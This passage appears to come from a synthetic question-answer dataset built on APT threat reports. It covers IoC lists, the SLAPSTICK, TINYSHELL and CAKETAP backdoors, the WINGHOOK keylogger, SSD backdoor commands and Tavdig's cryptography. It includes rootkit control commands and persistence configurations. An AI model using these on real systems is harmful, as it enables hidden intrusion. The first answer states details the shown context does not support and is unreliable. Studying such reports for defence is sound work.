In this instance, if any of the previously discussed registry keys were present, the sample will execute the dropped runas.exe binary. Given this execution, nvsvc.exe is likely also an older component. As discussed above the UP007 sample we analyzed shares the same C2 (computer.security-centers[.]com) as the Trochilus RAT sample reported by (<http://www.arbornetworks.com/blog/asert/uncovering-the-seven-pointed-dagger/>)ASERT.\nIn November 2015, Palo Alto Networks reported on a newly discovered trojan referred to as (<http://researchcenter.paloaltonetworks.com/2015/11/attack-campaign-on-the-government-of-thailand-delivers-bookworm-trojan/>)Bookworm. They revealed a campaign focused on the targeting of government entities in Thailand. The campaign used a malware family known as FFRAT, and the sample described in the report connected to the domain hkemail.f3322[.]org for command and control. In August 2015, the same domain was reportedly used to host an instance of UP007 as well.\nFinally, the relationship between the SLServer C2 www.olinaodi[.]com and our previous research into the (<https://citizenlab.org/2013/08/surtr-malware-family-targeting-the-tibetan-community/>)Surtr malware family was highlighted by PwC through the overlap in the toucan6712@163[.]com registrant. We (<https://targetedthreats.net/>)tracked malware campaigns using the Surtr family that have targeted Tibetan organizations since 2013.\nMedium Headline: Conclusion\nThis latest espionage campaign against Hong Kong activists appears to be connected to a broader set of targets, and operations. The recent detailed reporting by (<https://www.arbornetworks.com/blog/asert/wp-content/uploads/2016/01/ASERT-Threat-Intelligence-Brief-2015-08-Uncovering-the-Seven-Pointed-Dagger.pdf>)ASERT makes it clear that the UP007 malware family has been found in previous campaigns targeting Burmese interests. In addition, the campaigns share some C2 infrastructure with previous operations against targets in Thailand and the Tibetan community. The domain registration connections between SLServer infrastructure and Surtr infrastructure also suggests some level of potential coordination between campaigns targeting Hong Kong groups and the Tibetan community. Despite these connections, it is unclear if these campaigns are being conducted by the same threat actor.\nWe cannot exclude the possibility that distinct operators have a degree of sharing of tools and infrastructure. Alternatively, security researcher Ned Moran has articulated a concept of a \"(<https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-malware-supply-chain.pdf>)digital quartermaster,\" to refer to an actor that supplies threat infrastructure and malware development resources to multiple groups. While these scenarios are plausible, we do not have enough data to properly assess these competing hypotheses, or to make conclusive statements about the identity of the threat actors.\nWhat is clear from our analysis is that civil society groups across Asia continue to be targeted by persistent and organized cyber espionage campaigns. Civil society often lack the resources and awareness to defend against these operations and closer attention to the threats they face is needed.\n\nBased on the above text, answer a question. What are the key similarities and differences between the SLServer sample analyzed in this report and the one reported by PwC, particularly in terms of their behavior and C2 communication?",
    "output": "The SLServer sample analyzed in this report and the one reported by PwC both involve a self-extracting archive designed to download a binary from a compromised website. Both samples were unable to obtain the final Keyainst.exe binary due to the behavior of the C2 server during analysis. Another instance of SLServer found on VirusTotal communicates with the same C2 server and contains a debug path indicating its development environment. Additionally, the UP007 dropper fzyy.exe was hosted at the same URL as the SLServer sample, suggesting a connection between these two malware families.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Appendix 2 \u2013IoCs\nInfy version 31: f07e85143e057ee565c25db2a9f36491102d4e526ffb02c83e580712ec00eb27\nInfy \"M\" version 8.0: 583349B7A2385A1E8DE682A43351798CA113CBBB80686193ECF9A61E6942786A\n5.9.94.34\n138.201.0.134\n138.201.47.150\n144.76.250.205\n138.201.47.158\n138.201.47.153\nus1s2[.]strangled[.]net uvps1[.]cotbm[.]com gstat[.]strangled[.]net secup[.]soon[.]it p208[.]ige[.]es lu[.]ige[.]es updateserver1[.]com updateserver3[.]com updatebox4[.]com bestupdateserver[.]com bestupdateserver2[.]com\nbestbox3[.]com safehostline[.]com youripinfo[.]com bestupser[.]awardspace[.]info box4035[.]net box4036[.]net box4037[.]net box4038[.]net box4039[.]net box4040[.]net box4041[.]net box4042[.]net box4043[.]net box4044[.]net box4045[.]net box4046[.]net box4047[.]net box4048[.]net box4049[.]net box4050[.]net box4051[.]net box4052[.]net box4053[.]net box4054[.]net box4055[.]net box4056[.]net box4057[.]net box4058[.]net box4059[.]net box4060[.]net box4061[.]net box4062[.]net box4063[.]net box4064[.]net box4065[.]net box4066[.]net box4067[.]net box4068[.]net box4069[.]net box4070[.]net box4071[.]net box4072[.]net box4075[.]net box4078[.]net box4079[.]net box4080[.]net box4081[.]net box4082[.]net box4083[.]net box4084[.]net\nbox4085[.]net box4086[.]net box4087[.]net box4088[.]net box4089[.]net box4090[.]net\n\nHow can the Indicators of Compromise (IoCs) listed in the Prince of Persia report help cybersecurity experts identify and mitigate potential threats related to the Infy malware?",
    "output": "A: The IoCs listed in the Prince of Persia report provide specific identifiers that cybersecurity experts can use to detect and respond to the Infy malware. These IoCs include hashes for different versions of the Infy malware, such as 'f07e85143e057ee565c25db2a9f36491102d4e526ffb02c83e580712ec00eb27' for Infy version 31 and '583349B7A2385A1E8DE682A43351798CA113CBBB80686193ECF9A61E6942786A' for Infy 'M' version 8.0. Additionally, the report lists IP addresses like '5.9.94.34', '138.201.0.134', and others, along with domain names such as 'us1s2[.]strangled[.]net', 'uvps1[.]cotbm[.]com', and many more. By monitoring network traffic for these IP addresses and domain names, and scanning systems for the presence of the listed file hashes, security teams can identify compromised systems and take appropriate actions to contain and eradicate the threat. This proactive approach helps in preventing further damage and ensures that the organization's defenses are up-to-date against known threats associated with the Infy malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What conditions must be met for a non-international armed conflict to be reclassified as an international armed conflict, particularly in the context of the Russo-Ukrainian conflict?",
    "output": "For a non-international armed conflict to be reclassified as an international armed conflict, a state must actively participate or exercise 'overall control' over the separatists. This involves not only financing, training, equipping, or providing operational support to local forces but also having a role in organizing, coordinating, and planning their operations. In the case of the Russo-Ukrainian conflict, if Russia actively participates or exercises such control over the Donetsk and Luhansk separatists, the conflict could be considered international.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Small Headline: Network, Cloud, and Data Center Protection\nWe commonly find deficiencies in network segmentation and secure configuration of cloud services. When customers do not have network segmentation properly implemented, detection and remediation are much more difficult, and the resulting impact of the breach is significantly higher. Neglecting to secure cloud services, such as the Office 365 email platform, results in attackers gaining access to sensitive emails and data and a limited ability for organizations to detect and investigate a breach.\nMandiant observed multiple cases of attackers targeting an organization's Office 365 instances to gain access to sensitive messages. Examples of techniques observed include malicious mailbox forwarding rules and abuse of the Office 365 eDiscovery functionality. We have seen attackers create the malicious mailbox forwarding rules by doing the following:\nVery Small Headline: Host and Endpoint Protection\nCommon areas of weakness in endpoint protection that we observed in organizations are advanced malware protections, investigation capabilities and application whitelisting. Many organizations rely on legacy signature-based protections on the endpoint. Coupled with that is the inability of information security professionals to conduct deep forensic analyses of malicious activity across the server and end user computing environments. Application whitelisting is another important detection and prevention control we see lacking in the organizations we assess. Without application whitelisting, end users and attackers have the ability to install arbitrary software in an uncontrolled manner. These weaknesses are commonly exploited by attackers in the initial compromise and establish foothold stages of the attacker lifecycle in the incidents we investigate.\nPhishing continues to be a primary preferred method of compromising organizations because of its simplicity and effectiveness. However, determined attackers will pivot to other methods of deploying malware. As an example, in May 2017, FireEye Threat Intelligence observed an uptick in activity related to an ongoing campaign distributing Emotet malware. A wide variety of lures and distribution methods were leveraged in this high-volume campaign, including malicious Word document attachments, links to Word documents, and links to JavaScript files to propagate Emotet malware. The actor(s) behind this campaign leveraged more than 300 compromised websites to host malicious Word documents and Emotet payloads.\nAdvanced malware protections at the email and endpoint levels provide a level of mitigation to these types of attacks; however, attacker tactics are continuously changing. Logs and detections from these controls should be regularly monitored and investigated for signs of further intrusion into the target organizations environment. Endpoint hardening such as application whitelisting and mitigations provided by the OS vendor should be applied across the organization.\n\nWhat are the common areas of weakness in endpoint protection that organizations often overlook, and how do attackers exploit these weaknesses during the initial compromise and foothold stages of an attack?",
    "output": "A: Common areas of weakness in endpoint protection include reliance on legacy signature-based protections, lack of deep forensic analysis capabilities, and absence of application whitelisting. Many organizations rely solely on signature-based protections, which are ineffective against new and advanced malware. Additionally, the inability to conduct deep forensic analyses limits the organization's ability to understand and respond to malicious activity. Without application whitelisting, both end users and attackers can install arbitrary software, leading to uncontrolled environments. Attackers exploit these weaknesses by using phishing and other methods to deliver malware, such as the Emotet malware campaign observed in May 2017. This campaign used various lures and distribution methods, including malicious Word documents and JavaScript files hosted on compromised websites, to propagate the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Summary\nThis Joint Analysis Report (JAR) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This document provides technical details regarding the tools and infrastructure used by the Russian civilian and military intelligence Services (RIS) to compromise and exploit networks and endpoints associated with the U.S. election, as well as a range of U.S. Government, political, and private sector entities. The U.S. Government is referring to this malicious cyber activity by RIS as GRIZZLY STEPPE.\nPrevious JARs have not attributed malicious cyber activity to specific countries or threat actors. However, public attribution of these activities to RIS is supported by technical indicators from the U.S. Intelligence Community, DHS, FBI, the private sector, and other entities. This determination expands upon the  released October 7, 2016, from the Department of Homeland Security and the Director of National Intelligence on Election Security.\nThis activity by RIS is part of an ongoing campaign of cyber-enabled operations directed at the U.S. government and its citizens. These cyber operations have included spearphishing campaigns targeting government organizations, critical infrastructure entities, think tanks, universities, political organizations, and corporations leading to the theft of information. In foreign countries, RIS actors conducted damaging and/or disruptive cyber-attacks, including attacks on critical infrastructure networks. In some cases, RIS actors masqueraded as third parties, hiding behind false online personas designed to cause the victim to misattribute the source of the attack. This JAR provides technical indicators related to many of these operations, recommended mitigations, suggested actions to take in response to the indicators provided, and information on how to report such incidents to the U.S. Government.\n\nQ: How did the Russian Intelligence Services (RIS) employ spearphishing campaigns in their GRIZZLY STEPPE operations, and what were the primary targets of these campaigns? Additionally, explain why these tactics were effective in compromising various entities.",
    "output": "A: The Russian Intelligence Services (RIS) employed spearphishing campaigns as part of their GRIZZLY STEPPE operations to target a wide range of entities, including government organizations, critical infrastructure entities, think tanks, universities, political organizations, and corporations. These campaigns aimed to steal information through targeted email messages designed to trick recipients into revealing sensitive data or granting unauthorized access. The effectiveness of these tactics stemmed from their ability to exploit human vulnerabilities, such as trust and curiosity, making it easier for RIS actors to gain entry into secure systems. By masquerading as trusted entities or using false online personas, RIS could mislead victims into misattributing the source of the attack, further complicating detection and response efforts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Extensive Use of SLAPSTICK and TINYSHELL Backdoors\nLike past UNC1945 intrusions, Mandiant observed UNC2891 make extensive use of the Pluggable Authentication Module (PAM) based backdoor we track as SLAPSTICK to aid with credential harvesting, and to provide backdoor access to compromised machines in victim networks. As detailed in our previous (<https://www.mandiant.com/resources/live-off-the-land-an-overview-of-unc1945>)blog post, SLAPSTICK provides persistent backdoor access to infected systems with a hard-coded magical password, it also logs authentication attempts and corresponding passwords in an encrypted log file. Although this is expected to have tremendously assisted UNC2891 with credential harvesting and lateral movement activities, it also provided valuable information to Mandiant Incident Responders. Although SLAPSTICK log files were often timestomped, Mandiant was able to decode them and trace some of the actor's lateral movement activities through the usage of the backdoor provided magical password.\nAlongside SLAPSTICK, UNC2891 often installed a custom variant of the (<https://github.com/creaktive/tsh>)publicly available TINYSHELL backdoor. UNC2891 TINYSHELL backdoors leveraged an external encrypted configuration file and some variants included additional functionality, such as the ability to communicate via a HTTP proxy with basic authentication. In line with the group's familiarity with Unix and Linux based systems, UNC2891 often named and configured their TINYSHELL backdoors with values that masqueraded as legitimate services that might be overlooked by investigators, such as systemd (SYSTEMD), name service cache daemon (NCSD), and the Linux at daemon (ATD).\nTINYSHELL Backdoor File Paths TINYSHELL Configuration File Paths\npm_systemd_mag <32-character string>\nsystemd_nme <system id>\npm_systemd_adr <C2 IP address/domain>\npm_systemd_prt <443 or 53>\npm_systemd_tme 300\nsystemd_non1 none\nsystemd_non2 none\nsystemd_non3 none\nsystemd_non4 none\nTable 2: Example decoded TINYSHELL configuration (systemd variant)\nIn the case of the systemd variant, UNC2891 also leveraged systemd service unit files for persistence of the TINYSHELL backdoor.\n/usr/lib/systemd/system/systemd-helper.service\n[Unit]\nDescription=Rebuild Hardware Database\n[Service]\nType=forking\nExecStart=/lib/systemd/systemd-helper\n[Install]\nWantedBy=multi-user.target\nTable 3: Service unit file used for TINYSHELL persistence\nBased on analyzed configurations, UNC2891 had configured TINYSHELL backdoors in a multi-hop structure that leveraged several compromised internal servers for command and control. In one case, Mandiant found evidence that suggests the actor had chained different TINYSHELL variants together to obtain remote access to a server inside a network segment with network restrictions.\nTo keep their network of TINYSHELL connections hidden, UNC2891 had installed and configured a rootkit to filter out these connections from network connection related APIs (keep reading for details on the CAKETAP rootkit). UNC2891 configured remotely accessible systems with TINYSHELL backdoors that used dynamic DNS domains for their external command and control channel. These domains were created per-host and were not used more than once, the subdomains sometimes resembled the hostname of the compromised machine. Mandiant was unable to collect passive DNS data for these dynamic DNS domains, suggesting that UNC2891 had likely enabled IP resolution for short periods of time when access to the network was required. At one victim, these TINYSHELL backdoors were configured to perform communications using TCP over port 53 and 443, likely as a mechanism to bypass outbound network protections, blend in with existing traffic, and evade detection.\nBig Headline: STEELHOUND, STEELCORGI and Environment Variable Keying\nUNC2891 often made use of the STEELCORGI in-memory dropper which decrypts its embedded payloads by deriving a ChaCha20 key from the value of an environment variable obtained at runtime. In many cases, Mandiant was unable to recover the requisite environment variables to decrypt the embedded payloads. However, in the limited samples we were able to decrypt, UNC2891 had deployed different versions of an extensive toolkit which appears to be developed under the name SUN4ME. SUN4ME contains tools for network reconnaissance, host enumeration, exploitation of known vulnerabilities, log wiping, file operations, as well as common shell utilities. Yoroi has previously (<https://yoroi.company/research/opening-steelcorgi-a-sophisticated-apt-swiss-army-knife/>)published information about this toolkit following our previous blog post on (<https://www.mandiant.com/resources/live-off-the-land-an-overview-of-unc1945>)UNC1945's usage of STEELCORGI.\nMandiant discovered UNC2891 leveraging a similar in-memory dropper that also used environment variables to decrypt its embedded payload but instead relied on RC4 encryption, we have named this STEELHOUND. In addition to functioning as dropper for an embedded payload, STEELHOUND is also able to encrypt new payloads by encrypting a target binary and writing it to disk along with a copy of itself and an end-of-file configuration.\nBig Headline: WINGHOOK and WINGCRACK\nDuring these investigations, Mandiant also discovered a family of keylogger malware we have named WINGHOOK and WINGCRACK.\nWINGHOOK is a keylogger for Linux and Unix based operating systems. It is packaged as a shared library (SO file) that hooks the read and fgets functions, which are two common functions used for processing user input. The captured data is stored in an encoded format in the directory /var/tmp/ with a filename that begins with .zmanDw.\nWINGCRACK is a utility that can decode and display the content of files containing encoded keylog data from WINGHOOK. The malware author appears to refer to these encoded files as \"schwing\" files.\nBig Headline: Utilities Observed\nMandiant previously observed UNC1945 use a large amount of different public and private tools during their intrusions, and this was also true for UNC2891. Mandiant discovered additional utilities that were leveraged by UNC2891:\nBINBASH is a simple ELF utility that executes a shell after setting the group ID and user ID to either \"root\" or specified values. BINBASH appears to be a (<https://packetstormsecurity.com/files/23336/Slx2k001.txt.html>)compilation of the source code.\nWIPERIGHT is an ELF utility that clears specific log entries on Linux and Unix based systems. It can remove entries associated with a given user in the lastlog, utmp/utmpx, wtmp/wtmpx, and pacct logs. It appears to have originated from , and possibly a .\nMIGLOGCLEANER is another ELF utility that wipes logs or remove certain strings from logs on Linux and Unix based systems. It is (<https://github.com/Kabot/mig-logcleaner-resurrected>)publicly available on GitHub.\nWhilst seemingly uncommon amongst threat actors, UNC2891 frequently used the uuencoding scheme to encode and decode files, such as malware binaries or files containing output from extensive host enumeration scripts. The actor often leveraged simple Perl wrapper scripts that performed uuencoding and uudecoding functions.\nBig Headline: CAKETAP\nCAKETAP is a kernel module rootkit that UNC2891 deployed on key server infrastructure running Oracle Solaris. CAKETAP can hide network connections, processes, and files. During initialization, it removes itself from the loaded modules list and updates the last_module_id with the previously loaded module to hide its presence.\nA hook is installed into the function ipcl_get_next_conn, as well as several functions in the ip module. This enables CAKETAP to filter out any connections that match an actor-configured IP address or port (local or remote).\nOne way to identify CAKETAP running on a Solaris system is to check for the presence of this hook. The following shows an example command to identify a hooked ipcl_get_next_conn function (Note: The mdb command may require special permissions on the system):\nroot@solaris:~# echo 'ipcl_get_next_conn::dis -n 0 ; ::quit' | mdb -k\nThe output in a clean SPARC Solaris system would look similar to the following:\nipcl_get_next_conn: save %sp, -0xb0, %sp\nA hooked function would begin with the sethi instruction as follows (the constant 0x11971c00 will change from instance to instance depending on where CAKETAP is loaded):\nipcl_get_next_conn: sethi %hi(0x11971c00), %g1\nAdditional hooks are installed into the mkdirat (make directory at) and getdents64 (get directory entries) system calls. CAKETAP uses the mkdirat hook to receive commands from paths containing the signal string.  Commands include configuring network filters, display or update its configuration, and to unhide itself. The getdents64 hook enables CAKETAP to hide files or directories on the file system containing the secret signal string. Table 4 contains the signal strings for the CAKETAP hooks.\nThe mkdirat hook enabled UNC2891 to control and configure CAKETAP through existing backdoor access to compromised servers by issuing shell commands that leverage these system calls (e.g. mkdir for mkdirat). A single character appended to the signal string indicated which command was to be executed. The following commands were observed:\nCommand Function\nFor example, to configure a new network filter and display the current configuration, the following commands might be used:\nmkdir /some/path/.caahGss187I192.168.1.10p80 - Add network filter for 192.168.1.10:80\nmkdir /some/path/.caahGss187S - Display current configuration\nThe hook installed into getdents64 filtered output to hide presence of the signal string in directory contents.\nMandiant observed UNC2891 load CAKETAP with the module name ipstat from attacker created directories that often resided somewhere inside the /var directory tree.\n\nWhat is the purpose and functionality of the WINGHOOK and WINGCRACK malware used by UNC2891? How does WINGHOOK capture and store data?",
    "output": "WINGHOOK is a keylogger for Linux and Unix-based operating systems used by UNC2891. It is packaged as a shared library (SO file) that hooks the read and fgets functions, which are common functions used for processing user input. The captured data is stored in an encoded format in the directory /var/tmp/ with a filename that begins with .zmanDw. WINGCRACK is a utility that can decode and display the content of files containing encoded keylog data from WINGHOOK. The malware author refers to these encoded files as 'schwing' files.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Executive Summary\nIn early July 2015, Chinese APT actors used an Adobe Flash Player exploit within a specific webpage detailing a noteworthy international legal case between the Philippines and China. This precedent setting legal case would be followed by many Southeast Asian nations, as well as others around the globe. The exploit appeared on day three of the Permanent Court of Arbitration tribunal, exposing an untold number of interested parties that visited the webpage to potential exploitation.\nWhen considered holistically, the intelligence supports the conclusion that this exploitation campaign was purposefully carried out against the backdrop of diplomatic and legal maneuvering. Despite Beijing's unwillingness to participate in the international arbitration and their rejection of the PCA's jurisdiction, there appears to be a distinct effort to surreptitiously target those who are interested in this landmark international legal case via electronic means.\nThreatConnect has shared the details of this incident to our Common Community within Incident (<https://app.threatconnect.com/tc/auth/incident/incident.xhtml?incident=839940>)20150710D: Permanent Court of Arbitration Flash Exploit. Log into your ThreatConnect account or register for one via our (<http://www.threatconnect.com/product/product_editions>)Community Editions and access the most comprehensive and widely adopted Threat Intelligence Platform on the market.\nAnswer this question: Why did the Chinese APT actors choose to use an Adobe Flash Player exploit during the Permanent Court of Arbitration tribunal, and how does this align with their strategic objectives?",
    "output": "The Chinese APT actors chose to use an Adobe Flash Player exploit during the Permanent Court of Arbitration tribunal to target individuals interested in the high-profile international legal case between the Philippines and China. This exploit was timed to coincide with the third day of the tribunal, suggesting a deliberate attempt to capitalize on the heightened interest and traffic to the webpage detailing the case. The exploit was likely aimed at gathering intelligence or compromising systems of those following the case, which included many Southeast Asian nations and others globally. This strategy aligns with China's broader objective of gaining insights into the legal proceedings and potentially influencing outcomes, despite their official stance of rejecting the PCA's jurisdiction and refusing to participate in the arbitration.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the Gen 2 sub-family of Hikit malware achieve stealth on 32-bit versions of Windows, and what specific measures are taken to reduce its visible footprint?",
    "output": "The Gen 2 sub-family of Hikit malware achieves stealth on 32-bit versions of Windows by installing a rootkit. The DLL contains a device driver image embedded within an encoded buffer, which the RAT functionality code extracts to the %TEMP% directory after XOR'ing the buffer with 0x76. The RAT functionality code then creates a service with the driver in the %TEMP% directory as the executable for the service, activates the service, and opens a handle to the device driver's interface (e.g., \\\\Globals\\\\HTTPS). To reduce the visible footprint, the service is deleted, and the rootkit's cloaking functionality is used to hide the DLL's PID, any references to the GUID {4AE26357-79A3-466D-A6D9FC38BFB67DEA}, the DLL's service names (e.g., 'NetDDESrv' and 'Network DDE Service'), and the service entry. Additionally, the code attempts to hide a service named 'Hitx'. These measures collectively reduce the detectability of the malware on the infected system.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Web shell within a web shell: compiled FOXSHELL\nThe versions that were described above, targeted entities in Middle Eastern countries, such as Saudi Arabia, Qatar, and the United Arab Emirates. This version, in addition to being leveraged against Middle Eastern governmental entities, was part of the against the Albanian government in May 2021. Through the exploitation of an Internet-facing Microsoft SharePoint server, the actors deployed ClientBin.aspx on the compromised server to proxy external connections and thus facilitate lateral movement throughout the victim's environment.\nThe details of the samples may vary but in all of them, the FOXHELL is compiled as DLL and embedded inside the base web shell in base64. The compiled DLL is loaded with System.Reflection.Assembly.Load, and then the ProcessRequest method from it is invoked. The DLL is written in .NET and has the name pattern App_Web_<random>.dll, which indicates an ASP.NET dynamically compiled DLL.\nThe App_Web* DLL is affected by the class and method obfuscation, and all the strings are encrypted with a combination of Base64, XOR with the first byte, and AES:\nWhen the web shell is compiled into DLL, it contains the initialization stub, which ensures that the web shell listens on the correct URI. In this case, the initialization happens in the following piece of code:\nif (!concertthis_medal.__initialized) {\nconcertthis_medal.__fileDependencies = base.GetWrappedFileDependencies(new string{\"~/1.aspx\"});\nconcertthis_medal.__initialized = true; }\nThis initialization sets the FOXSHELL to listen to the requests on the relative path ~/1.aspx, which we observed as an unused artifact in other web shells related to attacks involving LIONTAIL.\nInternally, the DLL has the same \"1.5\" version of FOXSHELL, which includes the WVRESET parameter to stop the proxy and the same default Bsae64 Encryption DLL as in previous versions.\nSmall Headline: C&C Communication\nThe SSD backdoor sets up C&C communication through an HTTP listener on the infected machine. It is achieved using two classes:\n\u2013 A class in the .NET Framework used for creating custom HTTP servers, independent of IIS and based on HTTP API.\nServerManager is used to extract the sites hosted by the IIS server and build the HashSet of URL prefixes to listen on:\nIn this specific case, the only relative URI configured in the malware sample is Temporary_Listen_Addresses. The malware then uses the HttpListener class to start listening on the specified URL prefixes:\nSmall Headline: C&C command execution\nThe backdoor has several capabilities: execute commands using cmd.exe, upload and download files, execute processes with specified arguments, and run additional .NET assemblies.\nFirst, if the POST request body contains data, the malware parses it and handles the message as one of the 4 commands it supports. Otherwise, if the request contains a parameter Vet, the malware simply decodes its value from base64 and executes it with cmd /c. If none of these is true, then the malware handles the heartbeat mechanism: if the request URL contains the string wOxhuoSBgpGcnLQZxipa in lowercase, then the malware sends back UsEPTIkCRUwarKZfRnyjcG13DFA along with a 200 OK response.\nThe data from the POST request is encrypted using Base64 and simple XOR-based encryption:\nAfter decrypting the data of the message, the malware parses it according to the following order:\nDWORD command_type\nDWORD command_name_length\nSTRING command_name\nSTRING data\nThe possible commands, as named by the threat actors, include:\n\"Command\" \u2013 Executes a process with a specified argument. In this case, the data is parsed to extract the process name and its argument.\n\"Upload\" \u2013 Uploads a file to the specified path in the infected system.\n\"Download\" \u2013 Sends a specified file to the threat actors.\n\"Rundll\" \u2013 Loads assembly and runs it with specified parameter (if exists).\nThe response data is built the same way as the request (returns command type, command name, and output) and then encrypted with the same XOR-based algorithm as the request.\nMedium Headline: WINTAPIX driver\nRecently, Fortinet a wave of attacks against Middle Eastern targets (mostly Saudi Arabia, but also Jordan, Qatar, and the United Arab Emirates) that involve kernel mode drivers that the researchers named WINTAPIX. Although the exact infection chain to install the drivers is unknown, they target only IIS servers as they use the IIS ServerManager object. The high-level execution flow is the following:\n1. WINTAPIX driver is loaded in the kernel.\n2. WINTAPIX driver enumerates user-mode processes to find a suitable process with local system privileges.\n3. WINTAPIX driver injects an embedded shellcode into a previously found process. The shellcode is generated using the open-source project, which allows the creation of a position-independent shellcode capable of loading and executing .NET assemblies from memory.\n4. The injected shellcode loads and executes an encrypted .NET payload.\nThe final payload is obfuscated with a commercial obfuscator in addition to already familiar class, method, and string obfuscations, and it combines the functionality of the SDD backdoor and FOXSHELL proxy. To achieve both, it listens on two sets of URL prefixes, using ServerManager and HTTPListener similarly to the SSD backdoor.\nThe FOXSHELL version used within the driver payload is set to 1.7. The main enhancement introduced in this version is the Event Log bypass using a  technique of suspending EventLog Service threads. The default EncryptionDll hardcoded in the driver is the same Bsae64.dll, and the core proxy structure remains largely unaltered when compared to FOXSHELL version 1.5.\nAs an extensive analysis of the WINTAPIX driver and its version was already provided, here we only highlight the main overlaps between those and other discussed tools that strengthen their affiliation:\nThe same code base as the SDD backdoor, including the heartbeat based on the same string values wOxhuoSBgpGcnLQZxipa and UsEPTIkCRUwarKZfRnyjcG13DFA.\nThe same supported backdoor command types and encryption with the same key.\nThe same codebase as FOXSHELL, structure, and functionality.\nThe same obfuscation and encryption methods.\nBig Headline: Conclusion\nFor the last few years, Scarred Manticore has been observed carrying out multiple stealthy operations in Middle Eastern countries, including gaining access to telecommunications and government organizations in the region, and maintaining and leveraging this access for months to systematically exfiltrate data from the victims' systems. Examining the history of their activities, it becomes evident how far the threat actor has come in improving their attacks and enhancing their approach which relies on passive implants.\nWhile LIONTAIL represents a logical progression in the evolution of FOXSHELL and still bears some distinctive characteristics that allow us to attribute attacks involving LIONTAIL to Scarred Manticore, it stands out from other observed variants. The LIONTAIL framework does not use common, usually monitored methods for implementing listeners: it no longer depends on Internet Information Services (IIS), its modules, or any other options and libraries provided by the .NET framework to manage IIS programmatically. Instead, it utilizes the lowest level of Windows HTTP Stack by interacting directly with the HTTP.sys driver. In addition, it apparently allows the threat actors to customize the implants, their configuration parameters, and loaders' file delivery type. All those have enhanced the stealth ability of the implants, enabling them to evade detection for an extended period.\nWe expect that Scarred Manticore operations will persist and may spread into other regions as per Iranian long-term interests. While most of the recent activity of Scarred Manticore is primarily focused on maintaining covert access and data extraction, the troubling example of the attack on the Albanian government networks serves as a reminder that nation-state actors may collaborate and share access with their counterparts in intelligence agencies.\n\nQ: Explain the command execution capabilities of the SSD backdoor used by Scarred Manticore. How does the malware handle different types of commands received via POST requests?",
    "output": "A: The SSD backdoor has several capabilities, including executing commands using cmd.exe, uploading and downloading files, executing processes with specified arguments, and running additional .NET assemblies. When a POST request is received, the malware parses the data and handles it as one of four supported commands: 'Command', 'Upload', 'Download', and 'Rundll'. If the request contains a parameter 'Vet', the malware decodes its value from base64 and executes it with cmd /c. If none of these conditions are met, the malware handles the heartbeat mechanism. The data from the POST request is encrypted using Base64 and simple XOR-based encryption, and the response data is built and encrypted similarly.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The main advantage of this approach is that the bit width of factor is never larger than 1025 (1024+1), while in the standard implementation, the factor can grow up to 2048 bits. In the traditional approach, the multiplication would have to be done in a 2048 bit target, and this value would have to be taken modulus the prime number afterwards -this time in a far more complex way, one subtraction would not suffice. By not shifting the values to be added to the left every time, but instead shifting the result to the right (inside the finite field), the modulus action is implicitly performed at every step implicitly. This is a quite elegant approach, but it requires the multiplication function to be aware of the finite field. So this function is not just a big int function, but a field-aware big-int multiplication function.\nThe downside is that, after all 1024 bits are processed, factor was divided by two 1024 times, so the result is too \"small\" (which mathematically is the wrong term inside the field, but we use it as an analogy): instead of ab, the value ab/(2\u02c61024) is returned.\nTo fix this problem, Tavdig uses a particular code to calculate a corrector value:\nThe corrector is initialized to 1 (not shown in the above screenshot), and is then multiplied with two 2048 times (twice the value of 1024). So, the final result is 2\u02c62048. Because we're operating in a field, this value can be normalized to the modulus. Now, after each multiplication, another multiplication with this corrector is required to fix the fact that the original multiplication returned a \"too small\" value. Because this second correction multiplication itself uses the same multiplication function returning \"too small\" values, the corrector needs to fix for both multiplications errors. This is why the corrector fixed for 2048 and not only 1024 right shifts.\nThis can be seen in the code to calculate a exponentiation algorithm (base\u02c6power) inside the field:\nHere we see that every multiplication is immediately followed by a second multiplication with the corrector. The exponentiation algorithm is rather straightforward: every bit in the power value is scanned, at each step base is multiplied to itself, and whenever a 1 bit is hit, base is multiplied to the result value, which is initialized with 1. This is the standard binary exponentiation algorithm.\nNow all required big number operations are available. They are used in a final decryption code like this:\nAfter the corrector is calculated, the variable minusOneMinusPK is initialized with the modulus (equivalent to 0), the XOR with 1 corresponds with subtracting one (the modulus is a prime and always odd), resulting in the value -1 of the field. The private key x is subtracted, and -as the comment depicts -coeff base \u02c6(-1-x) is calculated. This is basically the (<https://en.wikipedia.org/wiki/ElGamal_encryption#Decryption>)ElGamal decryption. Side note: the weird name minusOneMinusPK was chosen during the reversing process and should help the reverser to remember the variable contains \"-1 minus private key\" -finding good names for not yet completely known objects is one of the challenges of reverse engineering, and this sometimes fails or ends in weird names\u2026\nThe encrypted data blob is not sent as-is, but base-64 encoded and put into a server response that looks like this:\nSo, the base-64 encoded payload is placed between <div> and </div> and some text placed around. The trojan ignores the stuff around and only scans for <div> and </div>. Interestingly, above text is followed by many newlines. We assume this is done to flush the output if the payload is too small.\n\nIn the context of the RUAG cyber espionage case, how does the custom multiplication function used by Tavdig differ from the standard implementation, and what advantages does it offer? Additionally, explain the role of the 'corrector' value in this multiplication process.",
